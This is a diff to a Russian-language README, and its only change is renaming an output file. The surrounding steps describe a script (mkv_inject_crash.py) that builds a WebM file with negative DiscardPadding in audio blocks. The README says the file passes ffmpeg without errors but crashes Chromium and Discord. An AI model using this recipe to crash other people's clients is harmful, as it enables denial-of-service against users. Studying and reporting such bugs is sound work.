@@ -60,12 +60,12 @@ python mkv_add_codecdelay.py clean.webm step2.webm
 
 # 3. Оборачиваем 3 полноразмерных (1024 сэмпла) аудио-блока в середине потока
 #    в BlockGroup с отрицательным DiscardPadding (-1025 сэмплов).
-python mkv_inject_crash.py step2.webm crash.webm --start-index 200 --count 3 --min-step-ms 15
+python mkv_inject_crash.py step2.webm crash_129.webm --start-index 200 --count 3 --min-step-ms 15
 ```
 
-Итог — `crash.webm`:
+Итог — `crash_129.webm`:
 
-- `ffmpeg -v error -i crash.webm -f null -` → **0 ошибок**;
+- `ffmpeg -v error -i crash_129.webm -f null -` → **0 ошибок**;
 - Chromium / Discord → **краш**.
 
 Полезные флаги `mkv_inject_crash.py`:
